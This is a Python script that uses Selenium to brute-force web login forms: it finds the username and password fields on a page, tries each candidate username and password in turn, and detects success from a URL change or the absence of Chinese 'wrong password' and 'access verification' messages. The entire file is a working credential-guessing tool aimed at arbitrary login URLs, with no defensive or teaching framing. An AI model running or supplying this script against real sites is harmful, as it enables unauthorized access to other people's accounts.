from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

def find_login_fields(driver):
    """
    Auto-detect username and password input fields on the page.
    Return (username_field, password_field) or (None, None) if not found.
    """
    password_fields = driver.find_elements(By.XPATH, "//input[@type='password']")
    if not password_fields:
        return None, None
    password_field = password_fields[0]
    # Try to find username field before password field in DOM
    all_inputs = driver.find_elements(By.XPATH, "//input")
    username_field = None
    for i, el in enumerate(all_inputs):
        if el == password_field and i > 0:
            # Search backwards for likely username field
            for j in range(i-1, -1, -1):
                t = all_inputs[j].get_attribute("type")
                if t in ["text", "email"]:
                    username_field = all_inputs[j]
                    break
            break
    return username_field, password_field

def brute_force(url, username, password_list, delay=2, success_url=None, verbose=True):
    """
    Try all passwords in password_list on the given url with the given username.
    If username is None, only fill password field.
    If username is a list or generator, try each username with all passwords (fixed password if password_list is a single string).
    Auto-detects login fields. Stops when login is successful.
    """
    driver = webdriver.Chrome()  # You need to have chromedriver in PATH
    driver.get(url)
    # If username is iterable (not str/None), try all usernames
    if username is not None and not isinstance(username, str):
        for uname in username:
            for pwd in password_list:
                if verbose:
                    print(f"Trying username: {uname} password: {pwd}")
                driver.get(url)
                time.sleep(1)
                username_field, password_field = find_login_fields(driver)
                if not password_field:
                    print("Could not find password field.")
                    break
                if username_field:
                    username_field.clear()
                    username_field.send_keys(uname)
                password_field.clear()
                password_field.send_keys(pwd)
                try:
                    submit_btn = driver.find_element(By.XPATH, "//button[contains(text(),'提交')]")
                    submit_btn.click()
                except Exception:
                    password_field.send_keys(Keys.RETURN)
                time.sleep(delay)
                if success_url:
                    if driver.current_url.startswith(success_url):
                        print(f"Login success! Username: {uname} Password: {pwd}")
                        driver.quit()
                        return (uname, pwd)
                else:
                    if url not in driver.current_url and "访问验证" not in driver.page_source and "密码错误" not in driver.page_source:
                        print(f"Login success! Username: {uname} Password: {pwd}")
                        driver.quit()
                        return (uname, pwd)
        print("All username/password combinations tried, none succeeded.")
        driver.quit()
        return None
    # Default: username is str or None, password_list is iterable
    for pwd in password_list:
        if verbose:
            print(f"Trying password: {pwd}")
        driver.get(url)
        time.sleep(1)
        username_field, password_field = find_login_fields(driver)
        if not password_field:
            print("Could not find password field.")
            break
        if username_field and username is not None:
            username_field.clear()
            username_field.send_keys(username)
        password_field.clear()
        password_field.send_keys(pwd)
        try:
            submit_btn = driver.find_element(By.XPATH, "//button[contains(text(),'提交')]")
            submit_btn.click()
        except Exception:
            password_field.send_keys(Keys.RETURN)
        time.sleep(delay)
        if success_url:
            if driver.current_url.startswith(success_url):
                print(f"Login success! Password is: {pwd}")
                driver.quit()
                return pwd
        else:
            if url not in driver.current_url and "访问验证" not in driver.page_source and "密码错误" not in driver.page_source:
                print(f"Login success! Password is: {pwd}")
                driver.quit()
                return pwd
    print("All passwords tried, none succeeded.")
    driver.quit()
    return None